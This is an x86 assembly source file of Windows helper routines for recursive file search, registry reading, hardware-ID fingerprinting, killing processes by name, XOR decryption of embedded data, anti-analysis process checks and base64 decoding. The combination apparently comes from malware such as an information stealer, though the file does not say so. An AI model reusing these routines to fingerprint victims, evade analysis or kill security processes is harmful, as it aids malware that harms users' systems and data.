SomeRecursiveFunc proc ppath:DWORD, lpcallbackfunc:DWORD
      LOCAL   lwfd: WIN32_FIND_DATA
      LOCAL   lhsearch: DWORD
      
      inc     recursive_index
      .if     recursive_index > 7
              jmp     shut_rec_search_1
      .endif
      
      push    dword ptr [ppath]
      call    dword ptr [_PathAddBackslash]
      lstrcat, ppath, addr wildc
      
      FindFirstFile, ppath, addr lwfd
      mov     lhsearch, eax
      .if     eax == INVALID_HANDLE_VALUE
              jmp     shut_rec_search_1
      .endif
    lc_search_lp:
      mov     eax, lwfd.dwFileAttributes
      and     eax, FILE_ATTRIBUTE_DIRECTORY
      je      lc_its_file
      lstrcmp, addr fake1, addr lwfd.cFileName
      .if     eax == 0
              jmp     lc_next_file
      .endif
      lstrcmp, addr fake2, addr lwfd.cFileName
      .if     eax == 0
              jmp     lc_next_file
      .endif
      push    ppath
      call    _PathFindFileName
      push    eax
      mov     byte ptr [eax], 0
      lstrcat, ppath, addr lwfd.cFileName
      push    dword ptr [lpcallbackfunc]
      push    dword ptr [ppath]
      call    SomeRecursiveFunc
      pop     eax
      mov     byte ptr [eax], 0
      lstrcat, ppath, addr wildc
      jmp     lc_next_file
    lc_its_file:
      ; file is good
      lea     eax, dword ptr [lwfd.cFileName]
      push    eax
      push    dword ptr [ppath]
      call    dword ptr [lpcallbackfunc]
    lc_next_file:
      FindNextFile, lhsearch, addr lwfd
      .if     eax != 0
              jmp     lc_search_lp
      .endif
      FindClose, lhsearch
      
    shut_rec_search_1:
      dec     recursive_index
      ret
SomeRecursiveFunc endp

RegRead proc uses ebx reg_read_HKEY:DWORD, keypath:DWORD, value_name:DWORD, buf_out:DWORD, buf_size:DWORD, dataout_type:DWORD
      LOCAL   reg_read_hKey    :DWORD
      LOCAL   reg_read_flag    :DWORD
      LOCAL   reg_read_index   :DWORD
      
      xor     ebx, ebx
      mov     reg_read_index, ebx
      
    reg_read_one_more_time:
      .if     reg_read_index == 0
              mov     reg_read_flag, KEY_READ or KEY_WOW64_32KEY
      .else
              mov     reg_read_flag, KEY_READ or KEY_WOW64_64KEY
      .endif
      
      lea     eax, reg_read_hKey
      push    eax
      push    dword ptr [reg_read_flag]
      push    0
      push    dword ptr [keypath]
      push    dword ptr [reg_read_HKEY]
      .if     ( dataout_type == REG_READ_A ) || ( dataout_type == REG_READ_W )
              call    _RegOpenKeyEx
      .elseif dataout_type == REG_READ_W_W
              call    _RegOpenKeyExW
      .endif
      .if     eax != ERROR_SUCCESS
              .if     reg_read_index != 1
                      inc     reg_read_index
                      jmp     reg_read_one_more_time
              .else
                      jmp     reg_read_key_aint_readable
              .endif
      .endif
      
      lea     eax, buf_size
      push    eax
      push    dword ptr [buf_out]
      push    0
      push    0
      push    dword ptr [value_name]
      push    dword ptr [reg_read_hKey]
      .if     dataout_type == REG_READ_A
              call    _RegQueryValueEx
      .elseif ( dataout_type == REG_READ_W ) || ( dataout_type == REG_READ_W_W )
              call    _RegQueryValueExW
      .endif
      .if     eax == ERROR_SUCCESS
              mov     ebx, dword ptr [buf_size]
      .else
              .if     reg_read_index != 1
                      push    dword ptr [reg_read_hKey]
                      call    _RegCloseKey
                      inc     reg_read_index
                      jmp     reg_read_one_more_time
              .else
                      xor     ebx, ebx
              .endif
      .endif
      
      push    dword ptr [reg_read_hKey]
      call    _RegCloseKey
    reg_read_key_aint_readable:
      
      mov     eax, ebx
      ret
RegRead endp

UnkTextToString proc lpstring:DWORD, stringlen:DWORD, lpbuf:DWORD
      push    0
      push    dword ptr [stringlen]
      push    dword ptr [lpstring]
      call    [_IsTextUnicode]
      .if     eax == 0
              RtlMoveMemory, lpbuf, lpstring, stringlen
      .else
              WideCharToMultiByte, CP_ACP, 0, lpstring, -1, lpbuf, stringlen, NULL, NULL
      .endif
      ret
UnkTextToString endp

KillProcessW proc pImageName:DWORD ; in unicode!
      LOCAL   hKillProcess:DWORD
      LOCAL   ProcessId:DWORD
      LOCAL   pBytesReturned:DWORD
      
      lea     eax, pBytesReturned
      push    eax
      push    sizeof pProcessIds
      push    offset pProcessIds
      call    _EnumProcesses
      test    eax, eax
      je      kill_shit_error
      mov     ecx, dword ptr [pBytesReturned]
      shr     ecx, 2
    kill_shit_get:
      push    ecx
      mov     eax, dword ptr [pProcessIds+ecx*4]
      mov     dword ptr [ProcessId], eax
      
      OpenProcess, PROCESS_QUERY_INFORMATION or PROCESS_VM_READ or PROCESS_TERMINATE, 0, ProcessId
      test    eax, eax
      je      kill_shit_next
      mov     hKillProcess, eax
      push    sizeof lpKillFilename
      push    offset lpKillFilename
      push    0
      push    dword ptr [hKillProcess]
      call    _GetModuleFileNameExW
      test    eax, eax
      je      kill_shit_incorrect
      
      push    offset lpKillFilename
      call    _PathFindFileNameW
      
      lstrcmpiW, eax, pImageName
      test    eax, eax
      je      kill_shit_mask_matched

      jmp     kill_shit_incorrect
      
    kill_shit_mask_matched:
      TerminateProcess, hKillProcess, 0
      
      Sleep, 1000

    kill_shit_incorrect:
      CloseHandle, hKillProcess
    kill_shit_next:
      pop     ecx
      dec     ecx
      jnz     kill_shit_get
    kill_shit_error:
      ret
KillProcessW endp

HashMem proc pointer :DWORD, lenz :DWORD, outbuf :DWORD, outlen :DWORD
      LOCAL   hHashProv :DWORD
      LOCAL   hHash :DWORD
      ;invoke  CryptAcquireContext, addr hHashProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT
      push    CRYPT_VERIFYCONTEXT
      push    PROV_RSA_AES
      push    0
      push    0
      lea     eax, hHashProv
      push    eax
      call    _CryptAcquireContext
      
      cmp     eax, 0
      jle     hash_init_fuckd_up_1
      
      ;invoke  CryptCreateHash, hHashProv, CALG_MD5, NULL, NULL, addr hHash
      lea     eax, hHash
      push    eax
      push    0
      push    0
      push    CALG_MD5
      push    dword ptr [hHashProv]
      call    _CryptCreateHash
      
      cmp     eax, 0
      jle     hash_init_fuckd_up_2
      
      ;invoke  CryptHashData, hHash, pointer, len, 0
      push    0
      push    dword ptr [lenz]
      push    dword ptr [pointer]
      push    dword ptr [hHash]
      call    _CryptHashData
      
      ;invoke  CryptGetHashParam, hHash, HP_HASHVAL, outbuf, addr outlen, 0
      push    0
      lea     eax, outlen
      push    eax
      push    dword ptr [outbuf]
      push    HP_HASHVAL
      push    dword ptr [hHash]
      call    _CryptGetHashParam
      
      
      ;invoke  CryptDestroyHash, hHash
      push    dword ptr [hHash]
      call    _CryptDestroyHash
      
    hash_init_fuckd_up_2:
      ;invoke  CryptReleaseContext, hHashProv, 0
      push    0
      push    dword ptr [hHashProv]
      call    _CryptReleaseContext
    hash_init_fuckd_up_1:
      ret
HashMem endp

GenHWIDString proc
      LOCAL   dwtmp:DWORD
      
      RtlZeroMemory, addr hwidbuf, sizeof hwidbuf
      mov     dword ptr [dwtmp], sizeof hwidbuf 
      lea     eax, dwtmp
      push    eax
      push    offset hwidbuf
      call    dword ptr [_GetUserName]
      lstrcpy, addr ComputerHWID, addr hwidbuf
      
      RtlZeroMemory, addr hwidbuf, sizeof hwidbuf
      mov     dword ptr [dwtmp], sizeof hwidbuf 
      GetComputerName, addr hwidbuf, addr dwtmp
      lstrcat, addr ComputerHWID, addr hwidbuf
      
      RtlZeroMemory, addr ovi, sizeof ovi
      mov     ovi.dwOSVersionInfoSize, sizeof ovi
      GetVersionEx, addr ovi
      push    ovi.dwBuildNumber
      push    ovi.dwMinorVersion
      push    ovi.dwMajorVersion
      push    offset format_winver
      push    offset hwidbuf
      call    wsprintf
      add     esp, 5*4
      lstrcat, addr ComputerHWID, addr hwidbuf
      
      GetSystemMetrics, SM_CYSCREEN
      push    eax
      GetSystemMetrics, SM_CXSCREEN
      push    eax
      push    offset format_scr_resol
      push    offset hwidbuf
      call    wsprintf
      add     esp, 4*4
      lstrcat, addr ComputerHWID, addr hwidbuf
      
      ; hash some shit baby!
      RtlZeroMemory, addr hwidbuf, sizeof hwidbuf
      lstrlen, addr ComputerHWID
      invoke  HashMem, addr ComputerHWID, eax, addr hwidbuf, sizeof hwidbuf
      
      ; swap some bytes baby!
      mov     eax, dword ptr [hwidbuf+0Ch]
      bswap   eax
      push    eax
      mov     eax, dword ptr [hwidbuf+08h]
      bswap   eax
      push    eax
      mov     eax, dword ptr [hwidbuf+04h]
      bswap   eax
      push    eax
      mov     eax, dword ptr [hwidbuf+00h]
      bswap   eax
      push    eax
      push    offset format_hwid
      push    offset ComputerHWID
      call    wsprintf
      add     esp, 6*4
      
      ret
GenHWIDString endp

CreateUniqName proc
      GetLocalTime, addr time
      movsx    eax, word ptr [time.wSecond]
      push     eax
      movsx    eax, word ptr [time.wMinute]
      push     eax
      movsx    eax, word ptr [time.wHour]
      push     eax
      movsx    eax, word ptr [time.wYear]
      push     eax
      movsx    eax, word ptr [time.wMonth]
      push     eax
      movsx    eax, word ptr [time.wDay]
      push     eax
      push     offset format_time
      push     offset TmpBuf2
      call     wsprintf
      add      esp, 8*4
      lstrcpy, addr UniqDirName, addr TmpBuf2
      ret
CreateUniqName endp

strpos proc needle:DWORD, haystack:DWORD, needle_len:DWORD, haystack_len:DWORD
     push    ebx
     push    esi
     push    edi
     mov     edx, dword ptr [needle_len]
     dec     edx
     mov     ecx, dword ptr [haystack_len]
     mov     esi, dword ptr [needle]
     mov     edi, dword ptr [haystack]
     push    edi
     js      f00404530
     mov     al, byte ptr [esi]
     inc     esi
     sub     ecx,edx
     jle     f00404530
f0040451c:
     repne   scas byte ptr [edi]
     jnz     f00404530
     mov     ebx,ecx
     push    esi
     push    edi
     mov     ecx,edx
     repe    cmpsb
     pop     edi
     pop     esi
     je      f404538
     mov     ecx,ebx
     jmp     f0040451c
f00404530:
     pop     edx
     xor     eax,eax
     jmp     f00404540
f404538:
     pop     edx
     mov     eax, edi
     sub     eax, 1
f00404540:
     pop     edi
     pop     esi
     pop     ebx
     ret
strpos endp

strposU proc needle:DWORD, haystack:DWORD, needle_len:DWORD, haystack_len:DWORD
     push    ebx
     push    esi
     push    edi
     mov     edx, dword ptr [needle_len]
     sub     edx, 2
     mov     ecx, dword ptr [haystack_len]
     shr     ecx, 1
     mov     esi, dword ptr [needle]
     mov     edi, dword ptr [haystack]
     push    edi
     js      f00404530
     mov     ax, word ptr [esi]
     add     esi, 2
     sub     ecx,edx
     jle     f00404530
f0040451c:
     repne   scas word ptr [edi]
     jnz     f00404530
     mov     ebx,ecx
     push    esi
     push    edi
     mov     ecx,edx
     repe    cmpsw
     pop     edi
     pop     esi
     je      f404538
     mov     ecx,ebx
     jmp     f0040451c
f00404530:
     pop     edx
     xor     eax,eax
     jmp     f00404540
f404538:
     pop     edx
     mov     eax, edi
     sub     eax, 2
f00404540:
     pop     edi
     pop     esi
     pop     ebx
     ret
strposU endp

MapFile proc uses ebx lpszFileName, lpMappedFile, A_or_W: DWORD
      mov     ebx, lpMappedFile
      assume  ebx: ptr map_file
      RtlZeroMemory, ebx, sizeof map_file
      .if     A_or_W == MAP_FILE_A
              CreateFile, lpszFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
      .elseif A_or_W == MAP_FILE_W
              CreateFileW, lpszFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
      .endif
      mov     [ebx].hFile, eax
      inc     eax
      jz      @mf_ret
      GetFileSize, eax, NULL
      mov     [ebx].dwFileSize, eax
      CreateFileMapping, [ebx].hFile, NULL, PAGE_READONLY, 0, 0, NULL
      .if     eax
              mov     [ebx].hMap, eax
              MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
              mov     [ebx].lpMem, eax
      .endif  
    @mf_ret:
      xor     eax, eax
      cmp     [ebx].lpMem, eax
      setnz   al
      assume  ebx: nothing            
      ret
MapFile endp

UnmapFile proc uses ebx lpMappedFile: DWORD
      mov     ebx, lpMappedFile       
      assume  ebx: ptr map_file
      .if     [ebx].hFile != -1
              UnmapViewOfFile, [ebx].lpMem
              CloseHandle, [ebx].hMap
              CloseHandle, [ebx].hFile
      .endif
      assume  ebx: nothing
      ret
UnmapFile endp

UTF8toACP proc from:DWORD, to:DWORD
     LOCAL   req_size :DWORD
     LOCAL   hWideChar :DWORD
     MultiByteToWideChar, CP_UTF8, 0, from, -1, 0, 0
     imul    eax, eax, 2
     add     eax, 2
     mov     dword ptr [req_size], eax
     VirtualAlloc, 0, req_size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
     mov     hWideChar, eax
     MultiByteToWideChar, CP_UTF8, 0, from, -1, hWideChar, req_size
     WideCharToMultiByte, CP_ACP, 0, hWideChar, -1, 0, 0, 0, 0
     mov     dword ptr [req_size], eax
     WideCharToMultiByte, CP_ACP, 0, hWideChar, -1, to, req_size, 0, 0
     VirtualFree, hWideChar, 0, MEM_RELEASE
     ret
UTF8toACP endp

CreateRndString proc to_data:DWORD, leng:DWORD
      pushad
      GetTickCount
      mov     edi, eax ; in EDI - seed
      mov     ecx, dword ptr [leng]
      mov     esi, dword ptr [to_data]
      mov     byte ptr [esi+ecx], 0
    rnd_str_lp:
      pushad
      Sleep, 1
      popad
      RDTSC
      xor     eax, edi
      rol     eax, cl
      mov     ebx, eax
      and     ebx, 0Fh
      add     ebx, 41h ; "A"
      mov     byte ptr [esi+ecx-1], bl
      dec     ecx
      jnz     rnd_str_lp
      popad
      ret
CreateRndString endp

Decrypt proc dataoffset:DWORD, datasize:DWORD, key_offset:DWORD
      KEY_SIZE equ 10h
      pushad
      mov     ebx, dword ptr [key_offset]
      mov     esi, dword ptr [dataoffset]
      mov     edi, esi
      xor     edx, edx
      mov     ecx, dword ptr [datasize]
      test    ecx, ecx
      jne     label_1
      jmp     exit_shit
    label_1:
      cmp     edx, KEY_SIZE
      jne     label_2
      xor     edx, edx
    label_2:
      lodsb
      xor     al, byte ptr [ebx+edx]
      stosb
      inc     edx
      dec     ecx
      jnz     label_1
    exit_shit:
      popad
      ret
Decrypt endp

IsExeRunning proc check_str:DWORD ; in - pointer to string. out: 0 - found, else - not found
      push    offset anti_bout
      push    sizeof anti_ProcessesListBuf
      push    offset anti_ProcessesListBuf
      call    _EnumProcesses
      test    eax, eax
      je      anti_proc_error
      mov     ecx, dword ptr [anti_bout]
      shr     ecx, 2
    anti_proc_get:
      push    ecx
      mov     eax, dword ptr [anti_ProcessesListBuf+ecx*4]
      mov     dword ptr [anti_pid], eax
      OpenProcess, PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, 0, anti_pid
      test    eax, eax
      je      anti_proc_next
      mov     anti_hProcess, eax
      push    sizeof anti_ModuleName
      push    offset anti_ModuleName
      push    0
      push    dword ptr [anti_hProcess]
      call    _GetModuleFileNameExW
      test    eax, eax
      je      anti_proc_next
      push    offset anti_ModuleName
      call    _PathFindFileNameW
      
      lstrcmpiW, eax, check_str
      test    eax, eax
      jne     strs_not_equal
      ; exe found in processes
      pop     ecx
      xor     eax, eax
      ret
    strs_not_equal:
           
    incorrect_proc:
      CloseHandle, anti_hProcess
    anti_proc_next:
      pop     ecx
      dec     ecx
      jnz     anti_proc_get
      
    anti_proc_error:
      ; Nothing found
      mov     eax, esp
      ret
IsExeRunning endp

base64_decode proc uses ecx ebx edi esi lpIn:DWORD, dwLen:DWORD
LOCAL InBuf:DWORD
LOCAL Len:DWORD
	or dwLen, 0
	jz @enddecode
	mov Len, 0
	mov esi, lpIn
	mov edi, esi
@next4bytes:
	xor ecx, ecx
	.while ecx < 4
		lodsb
		.if al >= 'A' && al <= 'Z'
			sub al, 'A'
		.elseif al >='a' && al <= 'z'
			sub al, 71
		.elseif al >='0' && al <= '9'
			add al, 4
		.elseif al == '/'
			add al, 16
		.elseif al == '+'
			add al, 19
		.elseif al == '='
			xor al, al
		.else
			jmp @f
		.endif
		stosb
		inc ecx
	@@:
		inc Len
		mov eax, Len
		cmp eax, dwLen
		ja @enddecode
	.endw
@@:
	mov edx, esi
	xor ebx, ebx
	;xor eax, eax
	mov ecx, 4
	sub edi, ecx
	mov esi, edi ;save esi
@@:
	lodsb
	shl ebx, 6
	or bl, al
	dec ecx
	jnz @b

	mov eax, ebx
	shl eax, 8
	bswap eax
	stosd
	dec edi
	mov esi, edx ;restore esi

	mov eax, Len
	cmp eax, dwLen
	jb @next4bytes
@enddecode:
  mov eax, edi
  sub eax, dword ptr [lpIn]
ret
base64_decode endp